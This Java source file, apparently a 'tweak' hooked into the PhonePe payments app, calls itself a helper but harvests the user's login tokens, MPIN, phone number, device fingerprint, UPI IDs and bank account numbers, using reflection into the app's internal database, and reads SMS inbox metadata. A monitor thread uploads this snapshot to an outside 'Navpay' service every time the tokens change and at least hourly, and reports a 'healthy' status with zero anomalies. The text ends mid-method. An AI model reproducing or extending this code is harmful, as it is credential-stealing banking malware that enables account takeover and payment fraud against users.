package com.PhonePeTweak.Def;

import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import com.phonepehelper.NavpayBridgeDbHelper;
import com.phonepehelper.NavpaySnapshotUploader;

import java.nio.charset.StandardCharsets;
import java.lang.reflect.Array;
import java.lang.reflect.Method;
import java.security.MessageDigest;
import java.text.SimpleDateFormat;
import java.util.Collection;
import java.util.Date;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.atomic.AtomicLong;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public final class PhonePeHelper {
    public enum TokenSyncResult {
        LOCAL_TO_SERVER,
        SERVER_TO_LOCAL,
        NO_CHANGE,
        ERROR
    }

    public interface ResultCallback {
        void onResult(boolean ok, String message);
    }

    private static final String TAG = "PPHelper";
    private static final String PREFS_NAME = "pph_store";
    private static final long TOKEN_SYNC_INTERVAL_MS = 5_000L;
    private static final long DEFAULT_FORCE_SNAPSHOT_UPLOAD_INTERVAL_MS = 3_600_000L;
    private static final long MIN_FORCE_SNAPSHOT_UPLOAD_INTERVAL_MS = 5_000L;
    private static final String FORCE_SNAPSHOT_UPLOAD_INTERVAL_PROPERTY = "navpay.snapshot.force_interval_ms";
    private static final String NAVPAY_UPLOAD_MODE = "token_change_driven";
    private static final String NAVPAY_SAMPLE_TYPE = "PHONEPE_SNAPSHOT";
    private static final String KEY_NAVPAY_TOTAL_UPLOAD_COUNT = "navpay_total_upload_count";

    private static final String KEY_USER_PHONE = "user_phone";
    private static final String KEY_X_DEVICE_FP = "x_device_fp";

    private static final String KEY_TOKEN_1FA = "token_1fa";
    private static final String KEY_TOKEN_SSO = "token_sso";
    private static final String KEY_TOKEN_AUTH = "token_auth";
    private static final String KEY_TOKEN_ACCOUNTS = "token_accounts";

    private static final String KEY_SENT_1FA = "sent_1fa";
    private static final String KEY_SENT_SSO = "sent_sso";
    private static final String KEY_SENT_AUTH = "sent_auth";
    private static final String KEY_SENT_ACCOUNTS = "sent_accounts";

    private static final String KEY_LAST_MPIN = "last_mpin";
    private static final String KEY_UPI_CACHE = "upi_cache";
    private static final int UPI_JSON_PARSE_MAX_DEPTH = 4;
    private static final int UPI_JSON_STRING_MAX_LENGTH = 8192;
    private static final String[] APP_SINGLETON_MODULE_CLASSES = new String[]{
            "com.phonepe.app.application.di.AppSingletonModule",
            "com.phonepe.app.di.AppSingletonModule",
            "com.phonepe.core.di.AppSingletonModule",
    };

    private static volatile Context appContext;
    private static volatile SharedPreferences prefs;
    private static volatile ScheduledExecutorService phoneNumberMonitor;
    private static final AtomicReference<Object> handlerRef = new AtomicReference<>();
    private static final AtomicLong lastForcedSnapshotUploadAtMs = new AtomicLong(0L);
    private static final AtomicLong navpayUploadCount = new AtomicLong(-1L);
    public static volatile String LastMpin = "";

    private PhonePeHelper() {}

    public static synchronized void init(Context context) {
        if (context == null) {
            return;
        }
        if (appContext != null) {
            return;
        }
        Context candidate = context.getApplicationContext();
        appContext = candidate != null ? candidate : context;
        prefs = appContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        Log.i(TAG, "PhonePeHelper.init ok");
    }

    public static Context getContext() {
        return appContext;
    }

    public static void setUserPhoneNum(String phoneNumber) {
        ensurePrefs();
        if (prefs == null) {
            return;
        }
        if (phoneNumber == null) {
            phoneNumber = "";
        }
        prefs.edit().putString(KEY_USER_PHONE, phoneNumber).apply();
        Log.i(TAG, "setUserPhoneNum: " + phoneNumber);
    }

    public static String getUserPhoneNum() {
        ensurePrefs();
        if (prefs == null) {
            return "";
        }
        return prefs.getString(KEY_USER_PHONE, "");
    }

    public static String readUserPhoneNum() {
        return getUserPhoneNum();
    }

    public static void setX_Device_Fingerprint(String fingerprint) {
        ensurePrefs();
        if (prefs == null) {
            return;
        }
        if (fingerprint == null) {
            fingerprint = "";
        }
        prefs.edit().putString(KEY_X_DEVICE_FP, fingerprint).apply();
    }

    public static String getDeviceFingerPrint() {
        ensurePrefs();
        if (prefs == null) {
            return "";
        }
        return prefs.getString(KEY_X_DEVICE_FP, "");
    }

    public static JSONObject get1faToken() {
        return readJson(KEY_TOKEN_1FA);
    }

    public static JSONObject getSSOToken() {
        return readJson(KEY_TOKEN_SSO);
    }

    public static JSONObject getAuthToken() {
        return readJson(KEY_TOKEN_AUTH);
    }

    public static JSONObject getAccountsToken() {
        return readJson(KEY_TOKEN_ACCOUNTS);
    }

    public static boolean set1faToken(JSONObject json) {
        return writeJson(KEY_TOKEN_1FA, json);
    }

    public static boolean saveSSOToken(JSONObject json) {
        return writeJson(KEY_TOKEN_SSO, json);
    }

    public static boolean saveSSOToken(Object tokenObj, int reason) {
        return writeJson(KEY_TOKEN_SSO, wrapObject(tokenObj, reason));
    }

    public static boolean saveAuthToken(JSONObject json) {
        return writeJson(KEY_TOKEN_AUTH, json);
    }

    public static boolean saveAccountsToken(JSONObject json) {
        return writeJson(KEY_TOKEN_ACCOUNTS, json);
    }

    public static boolean saveAccountsToken(Object tokenObj) {
        return writeJson(KEY_TOKEN_ACCOUNTS, wrapObject(tokenObj, 0));
    }

    public static JSONArray getUPIs() {
        ensurePrefs();
        if (prefs == null) {
            return buildFallbackUPIs();
        }
        JSONArray cached = readUPICache();
        if (isUsableUPIArray(cached)) {
            return cached;
        }
        JSONArray collected = refreshUPICacheFromTokens();
        if (isUsableUPIArray(collected)) {
            return collected;
        }
        return buildFallbackUPIs();
    }

    public static JSONArray refreshUPICacheFromTokens() {
        JSONArray collected = collectUPIsFromCoreDatabase();
        if (isUsableUPIArray(collected)) {
            persistUPICache(collected);
            return collected;
        }
        collected = collectUPIsFromTokens();
        if (isUsableUPIArray(collected)) {
            persistUPICache(collected);
            return collected;
        }
        clearUPICache();
        return new JSONArray();
    }

    public static JSONObject buildUPIInfo(String account, String accountNum, JSONArray vpas) {
        JSONObject obj = new JSONObject();
        try {
            obj.put("account", account == null ? "" : account);
            obj.put("accountNum", accountNum == null ? "" : accountNum);
            obj.put("appType", "phonepe");
            obj.put("upis", vpas == null ? new JSONArray() : vpas);
        } catch (JSONException e) {
            Log.w(TAG, "buildUPIInfo failed", e);
        }
        return obj;
    }

    public static JSONObject getRequestMetaInfoObj() {
        JSONObject obj = new JSONObject();
        try {
            String androidId = getAndroidId();
            String userPhone = getUserPhoneNum();
            String deviceFp = getDeviceFingerPrint();
            JSONObject tokens = buildTokenSnapshot();

            obj.put("package", appContext == null ? "" : appContext.getPackageName());
            obj.put("appType", "phonepe");
            obj.put("clientVersion", Build.VERSION.RELEASE);
            obj.put("userPhone", userPhone);
            obj.put("phoneNumber", userPhone);
            obj.put("androidId", androidId);
            obj.put("androidDeviceId", androidId);
            obj.put("device", Build.MODEL);
            obj.put("brand", Build.BRAND);
            obj.put("manufacturer", Build.MANUFACTURER);
            obj.put("xDeviceFingerprint", deviceFp);
            obj.put("deviceFingerprint", deviceFp);
            obj.put("handlerReady", handlerRef.get() != null);
            obj.put("metaBuiltAt", formatDate(System.currentTimeMillis()));
            obj.put("tokens", tokens);
            obj.put("token", tokens.optJSONObject("1fa"));
            obj.put("ssoToken", tokens.optJSONObject("sso"));
            obj.put("authToken", tokens.optJSONObject("auth"));
            obj.put("accountsToken", tokens.optJSONObject("accounts"));
        } catch (JSONException e) {
            Log.w(TAG, "getRequestMetaInfoObj failed", e);
        }
        return obj;
    }

    public static String getRequestMetaInfo() {
        String meta = getRequestMetaInfoObj().toString();
        logLong(TAG, "request-meta built: " + meta);
        return meta;
    }

    public static String getUPIRequestMetaInfo() {
        return getRequestMetaInfoObj().toString();
    }

    public static JSONObject buildSnapshotForNavpay() {
        JSONObject snapshot = new JSONObject();
        try {
            long now = System.currentTimeMillis();
            JSONObject requestMeta = getRequestMetaInfoObj();
            JSONArray upis = getUPIs();
            JSONObject requestPayload = buildNavpayRequestPayload(requestMeta, upis, now);
            long totalUploadCount = incrementNavpayUploadCount();
            JSONObject latestSample = buildNavpayRawSample(requestPayload, now, totalUploadCount);
            JSONArray rawSamples = new JSONArray();
            rawSamples.put(latestSample);
            JSONArray events = buildNavpayEvents(now, totalUploadCount, requestPayload, latestSample);
            JSONObject summary = buildNavpaySummary(now, totalUploadCount);
            JSONArray keySnapshot = buildNavpayKeySnapshot(now, requestMeta, requestPayload, summary, latestSample, totalUploadCount);

            snapshot.put("ok", true);
            snapshot.put("deviceId", getAndroidId());
            snapshot.put("deviceOnline", true);
            snapshot.put("deviceLastSeenAtMs", now);
            snapshot.put("uploadMode", NAVPAY_UPLOAD_MODE);
            snapshot.put("tokenCheckIntervalMs", TOKEN_SYNC_INTERVAL_MS);
            snapshot.put("summary", summary);
            snapshot.put("totalUploadCount", totalUploadCount);
            snapshot.put("latestSample", latestSample);
            snapshot.put("events", events);
            snapshot.put("keySnapshot", keySnapshot);
            snapshot.put("rawSamples", rawSamples);
            snapshot.put("rows", rawSamples);
            snapshot.put("lastCollectedAtMs", now);
        } catch (JSONException e) {
            Log.w(TAG, "buildSnapshotForNavpay failed", e);
        }
        return snapshot;
    }

    public static void uploadSnapshotToNavpayAsync() {
        JSONObject snapshot = buildSnapshotForNavpay();
        persistNavpaySnapshot(snapshot);
        NavpaySnapshotUploader.uploadSnapshotAsync(getAndroidId(), snapshot);
    }

    public static void startPhoneNumberMonitoring() {
        ensurePrefs();
        if (appContext == null) {
            Log.w(TAG, "startPhoneNumberMonitoring skipped: context null");
            return;
        }
        if (phoneNumberMonitor != null) {
            Log.i(TAG, "startPhoneNumberMonitoring skipped: already running");
            return;
        }
        final long forceSnapshotUploadIntervalMs = resolveForceSnapshotUploadIntervalMs();
        phoneNumberMonitor = Executors.newSingleThreadScheduledExecutor();
        phoneNumberMonitor.scheduleAtFixedRate(new Runnable() {
            private String lastPhone = getUserPhoneNum();
            private long tick = 0;

            @Override
            public void run() {
                tick++;
                String current = getUserPhoneNum();
                if (!TextUtils.equals(lastPhone, current)) {
                    lastPhone = current;
                    Log.i(TAG, "phone changed: " + current);
                }
                TokenSyncResult result = performTokenSync();
                long now = System.currentTimeMillis();
                if (result == TokenSyncResult.LOCAL_TO_SERVER) {
                    lastForcedSnapshotUploadAtMs.set(now);
                } else {
                    long lastForcedAt = lastForcedSnapshotUploadAtMs.get();
                    if (now - lastForcedAt >= forceSnapshotUploadIntervalMs) {
                        uploadSnapshotToNavpayAsync();
                        lastForcedSnapshotUploadAtMs.set(now);
                        Log.i(TAG, "forced snapshot upload tick=" + tick + ", intervalMs=" + forceSnapshotUploadIntervalMs);
                    }
                }
                Log.i(TAG, "monitor tick: " + tick + ", result=" + result);
            }
        }, 2_000, TOKEN_SYNC_INTERVAL_MS, TimeUnit.MILLISECONDS);
        Log.i(TAG, "startPhoneNumberMonitoring started: syncIntervalMs=" + TOKEN_SYNC_INTERVAL_MS
                + ", forceSnapshotUploadIntervalMs=" + forceSnapshotUploadIntervalMs);
    }

    public static void stopPhoneNumberMonitoring() {
        if (phoneNumberMonitor != null) {
            phoneNumberMonitor.shutdownNow();
            phoneNumberMonitor = null;
        }
        lastForcedSnapshotUploadAtMs.set(0L);
    }

    public static boolean publishTokenUpdateIfNeeded(boolean force) {
        ensurePrefs();
        if (prefs == null) {
            return false;
        }
        JSONObject snapshot;
        try {
            snapshot = buildTokenSnapshot();
        } catch (JSONException e) {
            Log.w(TAG, "publishTokenUpdateIfNeeded: build snapshot failed", e);
            return false;
        }
        String v1 = stringify(snapshot.optJSONObject("1fa"));
        String v2 = stringify(snapshot.optJSONObject("sso"));
        String v3 = stringify(snapshot.optJSONObject("auth"));
        String v4 = stringify(snapshot.optJSONObject("accounts"));

        String last1fa = prefs.getString(KEY_SENT_1FA, "");
        String lastSso = prefs.getString(KEY_SENT_SSO, "");
        String lastAuth = prefs.getString(KEY_SENT_AUTH, "");
        String lastAccounts = prefs.getString(KEY_SENT_ACCOUNTS, "");

        boolean changed = force
                || !TextUtils.equals(v1, last1fa)
                || !TextUtils.equals(v2, lastSso)
                || !TextUtils.equals(v3, lastAuth)
                || !TextUtils.equals(v4, lastAccounts);

        if (!changed) {
            return false;
        }

        prefs.edit()
                .putString(KEY_SENT_1FA, v1)
                .putString(KEY_SENT_SSO, v2)
                .putString(KEY_SENT_AUTH, v3)
                .putString(KEY_SENT_ACCOUNTS, v4)
                .apply();

        Log.i(TAG, "publishTokenUpdateIfNeeded: changed=" + changed + ", force=" + force);
        Log.i(TAG, "token snapshot: 1fa=" + summarizeToken(snapshot.optJSONObject("1fa"))
                + ", sso=" + summarizeToken(snapshot.optJSONObject("sso"))
                + ", auth=" + summarizeToken(snapshot.optJSONObject("auth"))
                + ", accounts=" + summarizeToken(snapshot.optJSONObject("accounts")));
        refreshUPICacheFromTokens();
        getRequestMetaInfo();
        uploadSnapshotToNavpayAsync();
        return true;
    }

    public static TokenSyncResult performTokenSync() {
        if (appContext == null || prefs == null) {
            Log.w(TAG, "performTokenSync: context or prefs unavailable");
            return TokenSyncResult.ERROR;
        }
        boolean updated = publishTokenUpdateIfNeeded(false);
        if (updated) {
            return TokenSyncResult.LOCAL_TO_SERVER;
        }
        return TokenSyncResult.NO_CHANGE;
    }

    public static void PublishMPIN(String mpin) {
        ensurePrefs();
        if (prefs == null) {
            return;
        }
        if (mpin == null) {
            mpin = "";
        }
        LastMpin = mpin;
        prefs.edit().putString(KEY_LAST_MPIN, mpin).apply();
        Log.i(TAG, "PublishMPIN: length=" + mpin.length());
    }

    public static void PublishMPIN() {
        PublishMPIN(LastMpin);
    }

    public static String getLastMpin() {
        ensurePrefs();
        if (prefs == null) {
            return "";
        }
        return prefs.getString(KEY_LAST_MPIN, "");
    }

    public static void readRecentSms() {
        if (appContext == null) {
            return;
        }
        try {
            ContentResolver resolver = appContext.getContentResolver();
            Uri uri = Uri.parse("content://sms/inbox");
            Cursor cursor = resolver.query(uri, new String[]{"_id", "date", "address"}, null, null, "date DESC");
            if (cursor == null) {
                Log.w(TAG, "readRecentSms: cursor null");
                return;
            }
            int count = 0;
            while (cursor.moveToNext() && count < 3) {
                long id = cursor.getLong(0);
                long date = cursor.getLong(1);
                String address = cursor.getString(2);
                Log.i(TAG, "sms id=" + id + " date=" + formatDate(date) + " from=" + address);
                count++;
            }
            cursor.close();
        } catch (Throwable t) {
            Log.w(TAG, "readRecentSms failed", t);
        }
    }

    public static void performDataSyncBackup() {
        Log.i(TAG, "performDataSyncBackup: noop");
    }

    public static void refreshToken(ResultCallback callback) {
        Log.i(TAG, "refreshToken: stub invoked");
        if (callback != null) {
            callback.onResult(true, "ok");
        }
    }

    public static void saveHandler(Object handler) {
        handlerRef.set(handler);
        Log.i(TAG, "saveHandler: " + (handler != null));
    }

    public static boolean shouldUpdateToken(String topic, String newValue, JSONObject currentValue) {
        if (TextUtils.isEmpty(newValue)) {
            return false;
        }
        if (currentValue == null || currentValue.length() == 0) {
            return true;
        }
        String oldValue = stringify(currentValue);
        if (TextUtils.equals(newValue, oldValue)) {
            return false;
        }
        long currentExpiry = parseExpiry(currentValue);
        long newExpiry = parseExpiry(safeJson(newValue));
        if (newExpiry > 0 && currentExpiry > 0) {
            boolean should = newExpiry >= currentExpiry;
            Log.i(TAG, "shouldUpdateToken(" + topic + "): currentExpiry=" + currentExpiry
                    + ", newExpiry=" + newExpiry + ", update=" + should);
            return should;
        }
        return true;
    }

    private static void ensurePrefs() {
        if (appContext == null) {
            return;
        }
        if (prefs == null) {
            prefs = appContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        }
    }

    private static boolean persistNavpaySnapshot(JSONObject snapshot) {
        ensurePrefs();
        if (appContext == null || snapshot == null) {
            return false;
        }
        return NavpayBridgeDbHelper.persistSnapshot(appContext, snapshot);
    }

    private static synchronized long incrementNavpayUploadCount() {
        ensurePrefs();
        long current = navpayUploadCount.get();
        if (current < 0L) {
            current = prefs == null ? 0L : prefs.getLong(KEY_NAVPAY_TOTAL_UPLOAD_COUNT, 0L);
        }
        long next = current + 1L;
        navpayUploadCount.set(next);
        if (prefs != null) {
            prefs.edit().putLong(KEY_NAVPAY_TOTAL_UPLOAD_COUNT, next).apply();
        }
        return next;
    }

    private static JSONObject buildNavpayRequestPayload(JSONObject requestMeta, JSONArray upis, long collectedAtMs) throws JSONException {
        JSONObject payload = new JSONObject();
        payload.put("requestMeta", requestMeta == null ? new JSONObject() : requestMeta);
        payload.put("upis", upis == null ? new JSONArray() : upis);
        payload.put("collectedAtMs", collectedAtMs);
        return payload;
    }

    private static JSONObject buildNavpayRawSample(JSONObject requestPayload, long now, long repeatCount) throws JSONException {
        String canonical = canonicalJson(requestPayload);
        String payloadHash = sha256Hex(canonical);
        JSONObject sample = new JSONObject();
        sample.put("id", buildNavpaySampleId(now, payloadHash));
        sample.put("type", NAVPAY_SAMPLE_TYPE);
        sample.put("createdAtMs", now);
        sample.put("collectedAtMs", now);
        sample.put("payload", requestPayload == null ? new JSONObject() : requestPayload);
        sample.put("payloadHash", payloadHash);
        sample.put("repeatCount", repeatCount);
        sample.put("firstSeenAtMs", now);
        sample.put("lastSeenAtMs", now);
        JSONObject meta = new JSONObject();
        meta.put("payloadHash", payloadHash);
        meta.put("repeatCount", repeatCount);
        meta.put("firstSeenAtMs", now);
        meta.put("lastSeenAtMs", now);
        sample.put("meta", meta);
        return sample;
    }

    private static JSONArray buildNavpayEvents(long now, long totalUploadCount, JSONObject requestPayload, JSONObject latestSample) throws JSONException {
        JSONArray events = new JSONArray();
        JSONObject event = new JSONObject();
        event.put("id", buildNavpayEventId(now));
        event.put("type", "SNAPSHOT_CAPTURED");
        event.put("severity", "info");
        event.put("summary", "phonepe helper snapshot captured");
        JSONObject detail = new JSONObject();
        detail.put("collectedAtMs", now);
        detail.put("totalUploadCount", totalUploadCount);
        detail.put("sampleId", latestSample == null ? "" : latestSample.optString("id", ""));
        detail.put("payloadHash", latestSample == null ? "" : latestSample.optString("payloadHash", ""));
        detail.put("payloadKeys", requestPayload == null ? 0 : requestPayload.length());
        event.put("detail", detail);
        event.put("createdAtMs", now);
        events.put(event);
        return events;
    }

    private static JSONObject buildNavpaySummary(long now, long totalUploadCount) throws JSONException {
        JSONObject summary = new JSONObject();
        summary.put("status", "healthy");
        summary.put("lastCollectedAtMs", now);
        summary.put("lastUploadDelayMinutes", 0);
        summary.put("uploads24h", totalUploadCount);
        summary.put("anomalies24h", 0);
        return summary;
    }

    private static JSONArray buildNavpayKeySnapshot(long now, JSONObject requestMeta, JSONObject requestPayload, JSONObject summary, JSONObject latestSample, long totalUploadCount) throws JSONException {
        JSONArray entries = new JSONArray();
        putNavpayKeySnapshotEntry(entries, "deviceId", getAndroidId(), now);
        putNavpayKeySnapshotEntry(entries, "deviceOnline", "true", now);
        putNavpayKeySnapshotEntry(entries, "deviceLastSeenAtMs", String.valueOf(now), now);
        putNavpayKeySnapshotEntry(entries, "uploadMode", NAVPAY_UPLOAD_MODE, now);
        putNavpayKeySnapshotEntry(entries, "tokenCheckIntervalMs", String.valueOf(TOKEN_SYNC_INTERVAL_MS), now);
        putNavpayKeySnapshotEntry(entries, "summary.status", summary == null ? "" : summary.optString("status", ""), now);
        putNavpayKeySnapshotEntry(entries, "summary.lastCollectedAtMs", String.valueOf(now), now);
        putNavpayKeySnapshotEntry(entries, "summary.uploads24h", String.valueOf(totalUploadCount), now);
        putNavpayKeySnapshotEntry(entries, "summary.anomalies24h", "0", now);
        putNavpayKeySnapshotEntry(entries, "totalUploadCount", String.valueOf(totalUploadCount), now);
        putNavpayKeySnapshotEntry(entries, "lastCollectedAtMs", String.valueOf(now), now);

        JSONObject tokenObj = requestMeta == null ? null : requestMeta.optJSONObject("token");
        putNavpayKeySnapshotEntry(entries, "requestMeta.androidId", requestMeta == null ? "" : requestMeta.optString("androidId", ""), now);
        putNavpayKeySnapshotEntry(entries, "requestMeta.deviceId", requestMeta == null ? "" : requestMeta.optString("deviceId", ""), now);
        putNavpayKeySnapshotEntry(entries, "requestMeta.packageName", requestMeta == null ? "" : requestMeta.optString("package", ""), now);
        putNavpayKeySnapshotEntry(entries, "requestMeta.token", tokenObj == null ? "" : tokenObj.toString(), now);
        putNavpayKeySnapshotEntry(entries, "latestSample.payloadHash", latestSample == null ? "" : latestSample.optString("payloadHash", ""), now);
        putNavpayKeySnapshotEntry(entries, "latestSample.id", latestSample == null ? "" : latestSample.optString("id", ""), now);
        putNavpayKeySnapshotEntry(entries, "requestPayload.collectedAtMs", requestPayload == null ? "" : String.valueOf(requestPayload.optLong("collectedAtMs", now)), now);
        return entries;
    }

    private static void putNavpayKeySnapshotEntry(JSONArray entries, String field, String value, long changedAtMs) throws JSONException {
        if (entries == null || TextUtils.isEmpty(field) || TextUtils.isEmpty(value)) {
            return;
        }
        JSONObject entry = new JSONObject();
        entry.put("field", field);
        entry.put("value", value);
        entry.put("changedAtMs", changedAtMs);
        entries.put(entry);
    }

    private static String buildNavpaySampleId(long now, String payloadHash) {
        String prefix = payloadHash == null || payloadHash.length() < 12 ? "000000000000" : payloadHash.substring(0, 12);
        return "phrs_" + now + "_" + prefix;
    }

    private static String buildNavpayEventId(long now) {
        return "phev_" + now;
    }

    private static String canonicalJson(JSONObject obj) {
        return obj == null ? "{}" : obj.toString();
    }

    private static String sha256Hex(String value) {
        try {
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] bytes = digest.digest((value == null ? "" : value).getBytes(StandardCharsets.UTF_8));
            StringBuilder sb = new StringBuilder(bytes.length * 2);
            for (byte b : bytes) {
                sb.append(Character.forDigit((b >> 4) & 0xf, 16));
                sb.append(Character.forDigit(b & 0xf, 16));
            }
            return sb.toString();
        } catch (Throwable t) {
            return "";
        }
    }

    private static long resolveForceSnapshotUploadIntervalMs() {
        String raw = System.getProperty(FORCE_SNAPSHOT_UPLOAD_INTERVAL_PROPERTY, "").trim();
        if (TextUtils.isEmpty(raw)) {
            return DEFAULT_FORCE_SNAPSHOT_UPLOAD_INTERVAL_MS;
        }
        try {
            long parsed = Long.parseLong(raw);
            if (parsed < MIN_FORCE_SNAPSHOT_UPLOAD_INTERVAL_MS) {
                Log.w(TAG, "force snapshot interval too small, clamped: " + parsed);
                return MIN_FORCE_SNAPSHOT_UPLOAD_INTERVAL_MS;
            }
            return parsed;
        } catch (NumberFormatException e) {
            Log.w(TAG, "invalid force snapshot interval: " + raw, e);
            return DEFAULT_FORCE_SNAPSHOT_UPLOAD_INTERVAL_MS;
        }
    }

    private static JSONObject readJson(String key) {
        ensurePrefs();
        if (prefs == null) {
            return new JSONObject();
        }
        String raw = prefs.getString(key, "");
        if (TextUtils.isEmpty(raw)) {
            return new JSONObject();
        }
        try {
            return new JSONObject(raw);
        } catch (JSONException e) {
            Log.w(TAG, "readJson failed: " + key, e);
            return new JSONObject();
        }
    }

    private static JSONArray readUPICache() {
        ensurePrefs();
        if (prefs == null) {
            return new JSONArray();
        }
        String raw = prefs.getString(KEY_UPI_CACHE, "");
        if (TextUtils.isEmpty(raw)) {
            return new JSONArray();
        }
        try {
            return normalizeUPIArray(new JSONArray(raw));
        } catch (JSONException e) {
            Log.w(TAG, "readUPICache parse failed", e);
            return new JSONArray();
        }
    }

    private static boolean persistUPICache(JSONArray upis) {
        ensurePrefs();
        if (prefs == null || !isUsableUPIArray(upis)) {
            return false;
        }
        prefs.edit().putString(KEY_UPI_CACHE, upis.toString()).apply();
        return true;
    }

    private static JSONArray collectUPIsFromTokens() {
        LinkedHashMap<String, JSONObject> entries = new LinkedHashMap<>();
        try {
            JSONObject tokens = buildTokenSnapshot();
            extractUpiEntriesFromJson("accounts", tokens.opt("accounts"), entries, 0);
            extractUpiEntriesFromJson("auth", tokens.opt("auth"), entries, 0);
            extractUpiEntriesFromJson("sso", tokens.opt("sso"), entries, 0);
            extractUpiEntriesFromJson("1fa", tokens.opt("1fa"), entries, 0);
        } catch (JSONException e) {
            Log.w(TAG, "collectUPIsFromTokens failed", e);
        }
        return entriesToArray(entries);
    }

    private static JSONArray collectUPIsFromCoreDatabase() {
        LinkedHashMap<String, JSONObject> entries = new LinkedHashMap<>();
        Object coreDatabase = resolveCoreDatabase();
        if (coreDatabase == null) {
            Log.i(TAG, "collectUPIsFromCoreDatabase: core database unavailable");
            return new JSONArray();
        }
        try {
            Object accountDao = invokeMethodNoThrow(coreDatabase, "E");
            Object accountsObj = queryAccountsFromDao(accountDao);
            if (!(accountsObj instanceof Collection)) {
                Log.i(TAG, "collectUPIsFromCoreDatabase: account dao query returned non-collection");
                return new JSONArray();
            }
            Collection<?> accounts = (Collection<?>) accountsObj;
            for (Object accountObj : accounts) {
                JSONObject entry = buildUPIEntryFromAccountObject(accountObj);
                if (entry != null) {
                    mergeUPIEntry(entries, entry);
                }
            }
        } catch (Throwable t) {
            Log.w(TAG, "collectUPIsFromCoreDatabase failed", t);
        }
        return entriesToArray(entries);
    }

    private static Object queryAccountsFromDao(Object accountDao) {
        if (accountDao == null) {
            return null;
        }
        Object accountTypes = readStaticField("com.phonepe.vault.core.dao.AccountDao", "a");
        Object result = invokeMethodNoThrow(accountDao, "r", accountTypes);
        if (result instanceof Collection) {
            return result;
        }
        result = invokeMethodNoThrow(accountDao, "n", accountTypes);
        if (result instanceof Collection) {
            return result;
        }
        result = invokeMethodNoThrow(accountDao, "h", accountTypes);
        if (result instanceof Collection) {
            return result;
        }
        return null;
    }

    private static JSONObject buildUPIEntryFromAccountObject(Object accountObj) {
        if (accountObj == null) {
            return null;
        }
        String type = normalizeText(readStringByMethods(accountObj,
                "getType",
                "getAccountType",
                "type"));
        String typeUpper = type.toUpperCase(Locale.US);
        if (typeUpper.contains("CREDIT")) {
            return null;
        }
        String accountNum = normalizeAccountNumber(readStringByMethods(accountObj,
                "getAccountNo",
                "getAccountNumber",
                "getMaskedAccountNumber",
                "accountNo",
                "accountNumber"));
        String account = normalizeText(readStringByMethods(accountObj,
                "getAccount",
                "getAccountName",
                "getDisplayName",
                "getBankName",
                "name"));
        LinkedHashSet<String> upis = new LinkedHashSet<>();
        collectUPIsFromObjectValue(invokeMethodNoThrow(accountObj, "getVpas"), upis);
        collectUPIsFromObjectValue(invokeMethodNoThrow(accountObj, "vpas"), upis);
        collectUPIsFromObjectValue(invokeMethodNoThrow(accountObj, "getUpis"), upis);
        if (upis.isEmpty()) {
            return null;
        }
        JSONArray upiArr = new JSONArray();
        for (String upi : upis) {
            upiArr.put(upi);
        }
        JSONObject entry = buildUPIInfo(account, accountNum, upiArr);
        try {
            entry.put("source", "core_db");
        } catch (JSONException e) {
            Log.w(TAG, "buildUPIEntryFromAccountObject failed", e);
        }
        return entry;
    }

    private static void extractUpiEntriesFromJson(String source, Object node, LinkedHashMap<String, JSONObject> entries, int depth) {
        if (node == null || depth > UPI_JSON_PARSE_MAX_DEPTH) {
            return;
        }
        if (node instanceof JSONObject) {
            JSONObject obj = (JSONObject) node;
            JSONObject candidate = buildUPIEntryFromJson(source, obj);
            if (candidate != null) {
                mergeUPIEntry(entries, candidate);
            }
            if (depth >= UPI_JSON_PARSE_MAX_DEPTH) {
                return;
            }
            Iterator<String> keys = obj.keys();
            while (keys.hasNext()) {
                String key = keys.next();
                Object value = obj.opt(key);
                if (value == null) {
                    continue;
                }
                extractUpiEntriesFromJson(key, value, entries, depth + 1);
            }
            return;
        }
        if (node instanceof JSONArray) {
            if (depth >= UPI_JSON_PARSE_MAX_DEPTH) {
                return;
            }
            JSONArray arr = (JSONArray) node;
            for (int i = 0; i < arr.length(); i++) {
                extractUpiEntriesFromJson(source, arr.opt(i), entries, depth + 1);
            }
            return;
        }
        if (node instanceof String) {
            String raw = ((String) node).trim();
            if (TextUtils.isEmpty(raw) || raw.length() > UPI_JSON_STRING_MAX_LENGTH) {
                return;
            }
            if (looksLikeJson(raw) && shouldParseJsonString(source)) {
                try {
                    Object parsed = raw.startsWith("[") ? new JSONArray(raw) : new JSONObject(raw);
                    extractUpiEntriesFromJson(source, parsed, entries, depth + 1);
                } catch (JSONException e) {
                    Log.w(TAG, "extractUpiEntriesFromJson parse failed: " + source, e);
                }
            }
        }
    }

    private static JSONObject buildUPIEntryFromJson(String source, JSONObject obj) {
        if (obj == null) {
            return null;
        }
        String account = firstNonEmptyString(obj, "account", "accountName", "maskedAccountName");
        String accountNum = normalizeAccountNumber(firstNonEmptyString(obj,
                "accountNum",
                "accountNumber",
                "maskedAccountNumber",
                "maskedAccountNum",
                "accNum",
                "accNo"));
        String appType = normalizeAppType(firstNonEmptyString(obj, "appType"));
        if (TextUtils.isEmpty(appType)) {
            appType = "phonepe";
        }
        LinkedHashSet<String> upis = new LinkedHashSet<>();
        collectUPIsFromObject(obj, upis);

        if (upis.isEmpty()) {
            return null;
        }
        JSONArray upiArr = new JSONArray();
        for (String upi : upis) {
            upiArr.put(upi);
        }
        JSONObject entry = buildUPIInfo(account, accountNum, upiArr);
        try {
            entry.put("appType", appType);
        } catch (JSONException e) {
            Log.w(TAG, "buildUPIEntryFromJson failed", e);
        }
        return entry;
    }

    private static void collectUPIsFromObject(JSONObject obj, LinkedHashSet<String> upis) {
        if (obj == null || upis == null) {
            return;
        }
        addUPIValue(upis, obj.opt("upi"));
        addUPIValue(upis, obj.opt("upiId"));
        addUPIValue(upis, obj.opt("upi_id"));
        addUPIValue(upis, obj.opt("vpa"));
        addUPIValue(upis, obj.opt("vpaId"));
        addUPIValue(upis, obj.opt("vpa_id"));
        addUPIValue(upis, obj.opt("virtualPaymentAddress"));
